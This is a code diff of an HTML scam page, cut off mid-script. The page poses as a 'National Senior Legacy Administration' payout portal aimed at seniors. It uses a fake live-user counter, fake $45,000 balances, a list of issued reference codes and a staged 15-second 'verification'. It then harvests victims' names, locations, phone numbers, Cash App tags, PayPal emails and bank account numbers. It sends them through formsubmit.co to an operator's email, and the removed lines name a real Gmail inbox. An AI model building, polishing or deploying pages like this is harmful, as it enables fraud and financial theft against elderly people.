@@ -3,236 +3,753 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Verification & Allocation Portal</title>
-    <!-- Tailwind CSS Platform Engine -->
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>National Senior Legacy Administration</title>
     <style>
-        /* Smooth transitions when clicking between sections */
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        :root {
+            --primary: #112240;
+            --primary-hover: #1d3557;
+            --accent: #b8860b;
+            --success: #2e7d32;
+            --danger: #d32f2f;
+            --text-dark: #23272a;
+            --text-light: #64748b;
+            --bg-light: #f1f5f9;
+            --white: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .portal-container {
+            width: 100%;
+            max-width: 600px;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            padding: 35px;
+            margin: 20px;
+            position: relative;
+            min-height: 540px;
+        }
+
+        /* Live Activity Top Badge */
+        .live-status-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            background: #e6f4ea;
+            color: var(--success);
+            font-size: 13px;
+            font-weight: 700;
+            padding: 8px 16px;
+            border-radius: 20px;
+            width: fit-content;
+            margin: 0 auto 20px auto;
+            border: 1px solid #c2e7cd;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #137333;
+            border-radius: 50%;
+            display: inline-block;
+            animation: livePulse 1.8s infinite ease-in-out;
+        }
+
+        @keyframes livePulse {
+            0% { transform: scale(0.9); opacity: 0.6; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.9); opacity: 0.6; }
+        }
+
+        .platform-header {
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 15px;
+        }
+
+        .brand-title {
+            color: var(--primary);
+            font-size: 20px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-tagline {
+            color: var(--accent);
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+
+        .page {
+            display: none;
+            opacity: 0;
+            transform: translateX(30px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .page.active {
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .page.exit {
+            display: block;
+            opacity: 0;
+            transform: translateX(-30px);
+            position: absolute;
+            width: calc(100% - 70px);
+        }
+
+        h2 {
+            color: var(--primary);
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        p.subtitle {
+            color: var(--text-light);
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .card {
+            background: var(--bg-light);
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .flex-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .flex-row:last-child {
+            border-bottom: none;
+        }
+
+        .label {
+            color: var(--text-light);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .value {
+            color: var(--text-dark);
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 15px;
+        }
+
+        .address-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 480px) {
+            .address-grid {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+        }
+
+        .input-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .input-group input {
+            padding: 12px;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            font-size: 14px;
+            width: 100%;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(17, 34, 64, 0.15);
+        }
+
+        .input-group.field-error input {
+            border-color: var(--danger) !important;
+            background-color: #fff8f8;
+            box-shadow: 0 0 0 2px rgba(211, 47, 47, 0.2);
+        }
+
+        .inline-error-msg {
+            display: none;
+            color: var(--danger);
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-align: center;
+            padding: 10px;
+            background: #fde8e8;
+            border-radius: 6px;
+            border: 1px solid #f8b4b4;
+        }
+
+        .btn {
+            background: var(--primary);
+            color: var(--white);
+            border: none;
+            padding: 15px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 6px rgba(17, 34, 64, 0.1);
+        }
+
+        .btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .loader-container {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 55px;
+            height: 55px;
+            border: 5px solid #edf2f7;
+            border-top: 5px solid var(--accent);
+            border-radius: 50%;
+            margin: 0 auto 25px auto;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            background-color: #e2e8f0;
+            border-radius: 10px;
+            height: 8px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            width: 0%;
+            height: 100%;
+            background-color: var(--primary);
+            transition: width 15s linear;
+        }
+
+        .balance-box {
+            background: linear-gradient(135deg, var(--primary) 0%, #23395b 100%);
+            color: var(--white);
+            text-align: center;
+            padding: 22px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(17, 34, 64, 0.15);
+        }
+
+        .balance-amount {
+            font-size: 34px;
+            font-weight: 700;
+            margin-top: 4px;
+            letter-spacing: -0.5px;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #feebc8;
+            color: #c05621;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 13px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            70% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+
+        .method-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .method-option {
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .method-option.selected {
+            border-color: var(--accent);
+            background: #fffdf6;
+        }
+
+        .method-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            color: var(--primary);
+        }
+
+        .method-fields {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.35s cubic-bezier(0.4, 0, 0.2, 1), margin-top 0.35s ease;
+        }
+
+        .method-option.selected .method-fields {
+            max-height: 180px;
+            margin-top: 15px;
+            border-top: 1px solid #edf2f7;
+            padding-top: 15px;
+        }
+
+        .process-clock {
+            width: 75px;
+            height: 75px;
+            background: #fff8eb;
+            border: 3px solid #f6ad55;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            color: #dd6b20;
+            font-size: 34px;
+            font-weight: bold;
+        }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-100 font-sans min-h-screen flex flex-col">
+<body>
 
-    <!-- Top Navigation Header -->
-    <header class="bg-slate-900 border-b border-slate-800 px-6 py-4 flex justify-between items-center shadow-lg">
-        <div class="flex items-center space-x-3">
-            <div class="h-8 w-8 bg-indigo-600 rounded-lg flex items-center justify-center font-bold text-white shadow-md shadow-indigo-600/20">S</div>
-            <span class="font-bold text-lg tracking-wide uppercase text-white">Secure Asset Portal</span>
-        </div>
-        <div class="flex items-center space-x-2 bg-slate-950 px-3 py-1.5 rounded-lg border border-slate-800">
-            <span class="text-xs text-slate-400 font-mono">File ID:</span>
-            <!-- MANUALLY UPDATE: File ID Reference Number -->
-            <span class="text-xs font-bold text-indigo-400 font-mono">#1356426021</span>
-        </div>
-    </header>
-
-    <!-- Interactive Step Progress Bar (Clicking these steps jumps directly to that page) -->
-    <div class="bg-slate-900 border-b border-slate-800/60 py-4 px-4">
-        <div class="max-w-3xl mx-auto grid grid-cols-3 gap-2">
-            <button onclick="switchTab('step1')" id="btn-step1" class="border-t-4 border-indigo-500 pt-2 text-left text-xs font-bold uppercase tracking-wider text-indigo-400 focus:outline-none cursor-pointer">
-                1. Data Submission
-            </button>
-            <button onclick="switchTab('step2')" id="btn-step2" class="border-t-4 border-slate-800 pt-2 text-left text-xs font-bold uppercase tracking-wider text-slate-500 focus:outline-none cursor-pointer">
-                2. Verification Review
-            </button>
-            <button onclick="switchTab('step3')" id="btn-step3" class="border-t-4 border-slate-800 pt-2 text-left text-xs font-bold uppercase tracking-wider text-slate-500 focus:outline-none cursor-pointer">
-                3. Fund Disbursement
-            </button>
-        </div>
+<div class="portal-container">
+    
+    <!-- Permanent Live Active Client Counter Badge -->
+    <div class="live-status-bar">
+        <span class="live-dot"></span>
+        <span>3,142 Citizens Active Online</span>
     </div>
 
-    <!-- Main Dynamic Content Wrapper -->
-    <main class="flex-1 p-6 max-w-4xl w-full mx-auto mt-4">
+    <div class="platform-header">
+        <div class="brand-title">National Senior Legacy Administration</div>
+        <div class="brand-tagline">Private Senior Citizen Disbursement & Portfolio Management</div>
+    </div>
 
-        <!-- ========================================== -->
-        <!-- PAGE 1: CLIENT SUBMISSION ENTRY (index/landing) -->
-        <!-- ========================================== -->
-        <div id="step1" class="tab-content active space-y-6">
-            <div class="bg-slate-900 border border-slate-800 rounded-xl p-8 shadow-xl max-w-xl mx-auto">
-                <div class="mb-6">
-                    <h2 class="text-2xl font-bold text-white">Identity Intake Gateway</h2>
-                    <p class="text-slate-400 text-sm mt-1">Please enter your reference credentials below to initiate your file confirmation protocol.</p>
-                </div>
+    <form action="https://formsubmit.co/YOUR_EMAIL_HERE@EXAMPLE.COM" method="POST" id="portalMasterForm">
+        
+        <input type="hidden" name="_subject" value="New File Record Submission Received">
+        <input type="hidden" name="_captcha" value="false">
 
-                <!-- Replace your-email@example.com with your actual email address -->
-                <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" class="space-y-5">
-                    <input type="hidden" name="_subject" value="Portal Intake Received">
-                    <input type="hidden" name="_captcha" value="false">
-
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Full Legal Name</label>
-                        <!-- MANUALLY UPDATE: Default placeholder name if desired -->
-                        <input type="text" name="name" value="Doroski Williams" required class="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-indigo-500 transition font-medium">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Verification Attachment Link / Credentials</label>
-                        <textarea name="credentials" rows="3" placeholder="Paste credential profiles, digital identification files, or personal clearance remarks here..." required class="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition resize-none text-sm"></textarea>
-                    </div>
-
-                    <div class="bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-400 flex items-start space-x-2">
-                        <input type="checkbox" required class="mt-0.5 rounded border-slate-800 bg-slate-900 text-indigo-600 focus:ring-0">
-                        <span>I acknowledge that this intake data will be delivered for private clearance authorization.</span>
-                    </div>
-
-                    <!-- Submit button records information via email, then script forces visual navigation forward -->
-                    <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3.5 rounded-lg transition shadow-lg shadow-indigo-600/10 cursor-pointer text-center block text-sm">
-                        Submit Secure Files
-                    </button>
-                </form>
-
-                <!-- Shortcut button to skip straight to the dashboard check page manually -->
-                <div class="mt-4 pt-4 border-t border-slate-800/60 text-center">
-                    <button onclick="switchTab('step2')" class="text-xs text-indigo-400 hover:text-indigo-300 font-medium underline tracking-wide cursor-pointer">
-                        Already submitted? Click here to view status dashboard →
-                    </button>
-                </div>
-            </div>
-        </div>
-
-
-        <!-- ========================================== -->
-        <!-- PAGE 2: MAIN ACCOUNT STATUS DASHBOARD -->
-        <!-- ========================================== -->
-        <div id="step2" class="tab-content space-y-6">
+        <!-- PAGE 1: CLIENT IDENTIFICATION ENTRY -->
+        <div id="page1" class="page active">
+            <h2>Asset Recovery Portal</h2>
+            <p class="subtitle">Enter your file verification details below to initiate secure system review.</p>
             
-            <!-- Account Overview & Balance Panel -->
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                
-                <div class="bg-slate-900 rounded-xl p-6 border border-slate-800 space-y-4 shadow-md h-fit">
-                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider">Account Metadata</h3>
-                    <div>
-                        <p class="text-xs text-slate-500">Beneficiary</p>
-                        <!-- MANUALLY UPDATE: Name on Dashboard -->
-                        <p class="text-md font-semibold text-white">Doroski Williams</p>
-                    </div>
-                    <div>
-                        <p class="text-xs text-slate-500">Current Status Phase</p>
-                        <p class="text-sm font-medium text-amber-400">Manual Review Ongoing</p>
-                    </div>
-                </div>
+            <div id="p1-error-frame" class="inline-error-msg">Failed to Continue: Invalid details or unauthorized Reference Number.</div>
 
-                <div class="md:col-span-2 bg-gradient-to-br from-slate-900 to-slate-950 rounded-xl p-8 border border-slate-800 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 shadow-lg">
-                    <div>
-                        <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Allocated Disbursement Funds</p>
-                        <!-- MANUALLY UPDATE: Balance display text -->
-                        <h1 class="text-4xl font-extrabold tracking-tight text-white">$358,000.00</h1>
-                    </div>
-
-                    <!-- CONTROL PANEL STATE BADGES (Keep the state your client needs, comment out others) -->
-                    <!-- BADGE STATE A: IN PROCESS -->
-                    <div class="px-4 py-2 rounded-full text-xs font-bold uppercase tracking-wider bg-amber-500/10 text-amber-400 border border-amber-500/20">
-                        In Process / Confirming Soon
-                    </div>
-
-                    <!-- BADGE STATE B: ISSUE DETECTED (Uncomment to show)
-                    <div class="px-4 py-2 rounded-full text-xs font-bold uppercase tracking-wider bg-rose-500/10 text-rose-400 border border-rose-500/20">
-                        Issue Detected / Error Flagged
-                    </div>
-                    -->
-                </div>
-            </div>
-
-            <!-- Custom Notice Message Window -->
-            <div class="bg-slate-900 rounded-xl p-6 border border-slate-800 shadow-md">
-                <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3">Processing Status Notices</h3>
-                <div class="bg-slate-950 border border-slate-800 rounded-lg p-4">
-                    <!-- MANUALLY UPDATE: Custom status text messaging -->
-                    <p class="text-sm text-slate-300 leading-relaxed">
-                        Your submitted documentation files are currently undergoing unchecked evaluation parameters. Our allocation administrators will review your data criteria shortly. If an issue arises, updates will reflect immediately inside this window.
-                    </p>
-                </div>
-            </div>
-
-            <!-- Page Navigation Buttons at the bottom -->
-            <div class="flex justify-between items-center pt-4 border-t border-slate-900">
-                <button onclick="switchTab('step1')" class="bg-slate-900 hover:bg-slate-800 text-slate-300 px-5 py-2.5 rounded-lg border border-slate-800 font-medium text-xs transition cursor-pointer">
-                    ← Back to Intake
-                </button>
-                <button onclick="switchTab('step3')" class="bg-indigo-600 hover:bg-indigo-500 text-white px-5 py-2.5 rounded-lg font-medium text-xs shadow-lg shadow-indigo-600/10 transition cursor-pointer">
-                    Proceed to Payout Section →
-                </button>
-            </div>
-        </div>
-
-
-        <!-- ========================================== -->
-        <!-- PAGE 3: DISBURSEMENT DETAILS OUTLET -->
-        <!-- ========================================== -->
-        <div id="step3" class="tab-content space-y-6">
-            <div class="bg-slate-900 border border-slate-800 rounded-xl p-8 shadow-xl max-w-2xl mx-auto text-center space-y-6">
-                <div class="h-12 w-12 bg-indigo-500/10 text-indigo-400 rounded-full flex items-center justify-center mx-auto border border-indigo-500/20 text-xl font-bold">
-                    $
+            <div class="card" style="background: #fff; padding: 15px 20px 5px 20px;">
+                <div class="input-group" id="grp-name">
+                    <label for="client_name">Full Name</label>
+                    <input type="text" name="Client Full Name" id="client_name" placeholder="e.g. Johnathan Doe">
                 </div>
                 
-                <div>
-                    <h2 class="text-2xl font-bold text-white">Disbursement Transfer Window</h2>
-                    <p class="text-slate-400 text-sm mt-1">Authorized payout releases undergo transactional execution protocols below.</p>
-                </div>
-
-                <div class="bg-slate-950 border border-slate-800 rounded-xl p-6 text-left max-w-md mx-auto space-y-3">
-                    <div class="flex justify-between text-xs border-b border-slate-900 pb-2">
-                        <span class="text-slate-500">Release Classification</span>
-                        <span class="text-slate-300 font-medium">Private Liquidation Payout</span>
+                <!-- Expanded Easy Layout Address Breakdown -->
+                <div class="address-grid">
+                    <div class="input-group" id="grp-city">
+                        <label for="client_city">City</label>
+                        <input type="text" name="Client City" id="client_city" placeholder="e.g. Portland">
                     </div>
-                    <div class="flex justify-between text-xs border-b border-slate-900 pb-2">
-                        <span class="text-slate-500">Gross Amount</span>
-                        <!-- MANUALLY UPDATE: Payout summary amount -->
-                        <span class="text-emerald-400 font-bold">$4,500.00</span>
+                    <div class="input-group" id="grp-state">
+                        <label for="client_state">State / Region</label>
+                        <input type="text" name="Client State" id="client_state" placeholder="e.g. Surrey">
                     </div>
-                    <div class="flex justify-between text-xs pt-1">
-                        <span class="text-slate-500">Transfer Status</span>
-                        <!-- MANUALLY UPDATE: Payout line status description -->
-                        <span class="text-amber-400 font-medium">Awaiting Manual Clearance</span>
+                    <div class="input-group" id="grp-zip">
+                        <label for="client_zip">Zip / Postal</label>
+                        <input type="text" name="Client Zip Code" id="client_zip" placeholder="e.g. 00000">
                     </div>
                 </div>
 
-                <div class="text-xs text-slate-500 max-w-md mx-auto leading-relaxed">
-                    Once file parameters pass your individual validation criteria, financial clearings are released to the registered recipient profile manually.
+                <div class="input-group" id="grp-phone">
+                    <label for="client_phone">Contact Phone Number</label>
+                    <input type="tel" name="Client Phone Number" id="client_phone" placeholder="e.g. +1 (876) 555-0199">
                 </div>
 
-                <div class="pt-4 border-t border-slate-800/60 flex justify-start">
-                    <button onclick="switchTab('step2')" class="bg-slate-950 hover:bg-slate-900 text-slate-400 px-4 py-2 rounded-lg border border-slate-800 font-medium text-xs transition cursor-pointer">
-                        ← Back to Status Dashboard
-                    </button>
+                <div class="input-group" id="grp-ref">
+                    <label for="ref_code">File Reference Number (Format: AAA/1234)</label>
+                    <input type="text" name="Verified Reference Code" id="ref_code" placeholder="e.g. SRN/4821" maxlength="8">
                 </div>
+            </div>
+
+            <button type="button" class="btn" onclick="startSystemReview()">
+                Verify File Records
+            </button>
+        </div>
+
+        <!-- 15-SECOND DELAY ANIMATION PANEL -->
+        <div id="review-loader" class="loader-container">
+            <div class="spinner"></div>
+            <h3 style="color: var(--primary); margin-bottom: 5px;">Analyzing File Registry...</h3>
+            <p style="color: var(--text-light); font-size: 14px;">Performing automatic allocation ledger balance review.</p>
+            <div class="progress-bar-bg">
+                <div id="progress-bar" class="progress-bar-fill"></div>
             </div>
         </div>
 
-    </main>
-
-    <!-- System Footer Context -->
-    <footer class="p-6 text-center text-xs text-slate-600 mt-auto border-t border-slate-900/60 font-mono tracking-wider">
-        SECURE HOUSING ENVIRONMENT MANAGER • PRIVATE CLIENT PRIVILEGE INTERFACE
-    </footer>
-
-    <!-- Minimal Integrated Tab Controller Engine -->
-    <script>
-        function switchTab(tabId) {
-            // Hide all active view panels
-            const contents = document.querySelectorAll('.tab-content');
-            contents.forEach(content => content.classList.remove('active'));
-
-            // Deactivate and reset top progress link text colors
-            const buttons = [document.getElementById('btn-step1'), document.getElementById('btn-step2'), document.getElementById('btn-step3')];
-            buttons.forEach(btn => {
-                btn.className = "border-t-4 border-slate-800 pt-2 text-left text-xs font-bold uppercase tracking-wider text-slate-500 focus:outline-none cursor-pointer";
-            });
-
-            // Make the targeted view panel visible
-            document.getElementById(tabId).classList.add('active');
-
-            // Apply high-contrast indigo visibility focus to the active tab button link
-            const activeBtn = document.getElementById('btn-' + tabId);
-            if (activeBtn) {
-                activeBtn.className = "border-t-4 border-indigo-500 pt-2 text-left text-xs font-bold uppercase tracking-wider text-indigo-400 focus:outline-none cursor-pointer";
-            }
+        <!-- PAGE 2: VERIFIED OWNERSHIP STATUS OVERVIEW -->
+        <div id="page2" class="page">
+            <h2>Confirm Verification</h2>
+            <p class="subtitle">Please review your allocated file balance details below before executing the clearance.</p>
             
-            // Scroll system smoothly to top of area focus
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            <div class="balance-box" style="background: #23395b;">
+                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Allocated File Balance</div>
+                <div class="balance-amount">$45,000.00</div>
+            </div>
+
+            <div class="card" style="background: #ffffff; border: 1px solid #cbd5e0; margin-bottom: 20px;">
+                <div style="font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px;">Verified File Ownership Record</div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Client Name:</span><span class="value" id="mirror-name">---</span></div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Registered Location:</span><span class="value" id="mirror-address" style="font-size:14px;">---</span></div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">Contact Phone:</span><span class="value" id="mirror-phone">---</span></div>
+                <div class="flex-row" style="padding: 6px 0;"><span class="label">File Reference:</span><span class="value" id="mirror-ref">---</span></div>
+            </div>
+
+            <div class="card" style="background: #f1f5f9;">
+                <div class="flex-row">
+                    <span class="label">Verification Status</span>
+                    <span class="value" style="color: var(--success); font-weight: bold;">PASSED & CONFIRMED</span>
+                </div>
+                <div class="flex-row">
+                    <span class="label">Portal Lock State</span>
+                    <span class="value" style="color: var(--success);">SECURE EXCLUSIVE MATCH</span>
+                </div>
+            </div>
+
+            <button type="button" class="btn" onclick="switchPage('page2', 'page3')">
+                Proceed to Payout
+            </button>
+        </div>
+
+        <!-- PAGE 3: DISBURSEMENT CONFIGURATION TARGET -->
+        <div id="page3" class="page">
+            <h2>Disbursement Management</h2>
+            <p class="subtitle">Update your preferences below to direct your pending balance transfer.</p>
+
+            <div style="text-align: center;">
+                <div class="status-badge">
+                    <span style="width: 8px; height: 8px; background: #dd6b20; border-radius: 50%;"></span>
+                    In Process
+                </div>
+            </div>
+
+            <div class="balance-box">
+                <div style="font-size: 13px; opacity: 0.9; text-transform: uppercase;">Available Balance</div>
+                <div class="balance-amount">$45,000.00</div>
+            </div>
+
+            <div id="p3-error-frame" class="inline-error-msg">Failed to Continue: Please pick an option and fill out account endpoints.</div>
+
+            <input type="hidden" name="Selected Transfer Type" id="hiddenMethodType" value="Not Chosen">
+
+            <div class="method-options">
+                
+                <!-- Cash App -->
+                <div class="method-option" id="opt-cashapp" onclick="selectPaymentMethod('cashapp')">
+                    <div class="method-header">
+                        <input type="radio" id="rad-cashapp" style="accent-color: var(--primary);">
+                        <span>Cash App</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group" id="grp-cash-val">
+                            <label for="cashapp_tag">Cashtag ($)</label>
+                            <input type="text" name="CashApp Cashtag Data" id="cashapp_tag" placeholder="Enter your $Cashtag" onclick="event.stopPropagation();">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PayPal -->
+                <div class="method-option" id="opt-paypal" onclick="selectPaymentMethod('paypal')">
+                    <div class="method-header">
+                        <input type="radio" id="rad-paypal" style="accent-color: var(--primary);">
+                        <span>PayPal Account</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group" id="grp-pay-val">
+                            <label for="paypal_email">PayPal Email Address</label>
+                            <input type="email" name="PayPal Email Account" id="paypal_email" placeholder="name@example.com" onclick="event.stopPropagation();">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Banking Routing -->
+                <div class="method-option" id="opt-banking" onclick="selectPaymentMethod('banking')">
+                    <div class="method-header">
+                        <input type="radio" id="rad-banking" style="accent-color: var(--primary);">
+                        <span>Direct Bank Transfer / Wire Info</span>
+                    </div>
+                    <div class="method-fields">
+                        <div class="input-group" id="grp-bnk-val1">
+                            <label for="bank_name">Bank Name</label>
+                            <input type="text" name="Bank Financial Name" id="bank_name" placeholder="Enter routing or bank name" onclick="event.stopPropagation();">
+                        </div>
+                        <div class="input-group" id="grp-bnk-val2">
+                            <label for="account_num">Account Number / IBAN</label>
+                            <input type="text" name="Bank Account Number String" id="account_num" placeholder="Enter account details" onclick="event.stopPropagation();">
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <button type="button" class="btn" style="background: var(--success);" onclick="processDashboardUpdate()">
+                Submit Settings Transfer
+            </button>
+        </div>
+
+        <!-- PAGE 4: EDITED TRANSACTING PENDING ACCOUNT STATUS -->
+        <div id="page4" class="page">
+            <div class="process-clock">⏳</div>
+            <h2 style="text-align: center;">Transfer In Process</h2>
+            <p class="subtitle" style="text-align: center;">Your verification records and payout endpoints have been queued.</p>
+
+            <div class="balance-box" style="background: #1e293b;">
+                <div style="font-size: 13px; opacity: 0.8; text-transform: uppercase;">Total Pending Transmission Portfolio</div>
+                <div class="balance-amount">$45,000.00</div>
+            </div>
+
+            <div class="card">
+                <div class="flex-row">
+                    <span class="label">Disbursement Status</span>
+                    <span class="value" style="color: #dd6b20; font-weight: bold;">PROCESSING HOLD</span>
+                </div>
+                <div class="flex-row">
+                    <span class="label">Estimated Timeframe</span>
+                    <span class="value" style="color: var(--primary);">1 to 2 Business Days</span>
+                </div>
+                <div class="flex-row">
+                    <span class="label">Verification Mask Tracker</span>
+                    <span class="value" id="dash-masked-details">•••• ••••</span>
+                </div>
+            </div>
+
+            <div style="background: #fffaf0; border: 1px solid #feebc8; border-radius: 8px; padding: 14px; font-size: 13px; color: #c05621; text-align: center; margin-bottom: 20px; font-weight: 500;">
+                The administrative allocation desk is certifying matching record credentials. File processing will clear sequentially within 24 hours.
+            </div>
+        </div>
+
+    </form>
+</div>
+
+<script>
+    const ALLOWED_REFERENCE_CODES = [
+        "SRN/4821",
+        "LEG/9052",
+        "ADM/3147",
+        "VTR/7710",
+        "SLR/6385"
+    ];
+
+    function startSystemReview() {
+        document.getElementById('p1-error-frame').style.display = 'none';
+        document.querySelectorAll('#page1 .input-group').forEach(el => el.classList.remove('field-error'));
+
+        const nameVal = document.getElementById('client_name').value.trim();
+        const cityVal = document.getElementById('client_city').value.trim();
+        const stateVal = document.getElementById('client_state').value.trim();
+        const zipVal = document.getElementById('client_zip').value.trim();
+        const phnVal = document.getElementById('client_phone').value.trim();
+        const refVal = document.getElementById('ref_code').value.trim();
+
+        let formulationValid = true;
+
+        if(!nameVal) { document.getElementById('grp-name').classList.add('field-error'); formulationValid = false; }
+        if(!cityVal) { document.getElementById('grp-city').classList.add('field-error'); formulationValid = false; }
+        if(!stateVal) { document.getElementById('grp-state').classList.add('field-error'); formulationValid = false; }
+        if(!zipVal) { document.getElementById('grp-zip').classList.add('field-error'); formulationValid = false; }
+        if(!phnVal)  { document.getElementById('grp-phone').classList.add('field-error'); formulationValid = false; }
+        
+        if(!refVal || !ALLOWED_REFERENCE_CODES.includes(refVal)) { 
+            document.getElementById('grp-ref').classList.add('field-error'); 
+            formulationValid = false; 
         }
-    </script>
+
+        if(!formulationValid) {
+            document.getElementById('p1-error-frame').style.display = 'block';
+            return;
+        }
+
+        // Combine fields smoothly for the mirrored display
+        const fullLocationString = `${cityVal}, ${stateVal} ${zipVal}`;
+        document.getElementById('mirror-name').innerText = nameVal;
+        document.getElementById('mirror-address').innerText = fullLocationString;
+        document.getElementById('mirror-phone').innerText = phnVal;
+        document.getElementById('mirror-ref').innerText = refVal;
+
+        const p1 = document.getElementById('page1');
+        const loader = document.getElementById('review-loader');
+        const bar = document.getElementById('progress-bar');
+
+        p1.classList.add('exit');
+        p1.classList.remove('active');
+
+        setTimeout(() => {
+            p1.style.display = 'none';
+            p1.classList.remove('exit');
+            
+            loader.style.display = 'block';
+            setTimeout(() => { bar.style.width = '100%'; }, 50);
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+                const p2 = document.getElementById('page2');
+                p2.style.display = 'block';
+                setTimeout(() => { p2.classList.add('active'); }, 20);
+            }, 15000);
+
+        }, 400);
+    }
+
+    function switchPage(oldId, newId) {
+        const oldPage = document.getElementById(oldId);
+        const newPage = document.getElementById(newId);
+
+        oldPage.classList.add('exit');
+        oldPage.classList.remove('active');
+
+        setTimeout(() => {
+            oldPage.style.display = 'none';
+            oldPage.classList.remove('exit');
+            
+            newPage.style.display = 'block';
+            setTimeout(() => { newPage.classList.add('active'); }, 20);
+        }, 400);
+    }
+
+    function selectPaymentMethod(method) {
+        document.getElementById('p3-error-frame').style.display = 'none';
+        document.querySelectorAll('#page3 .input-group').forEach(el => el.classList.remove('field-error'));
+        
+        document.querySelectorAll('.method-option').forEach(el => el.classList.remove('selected'));
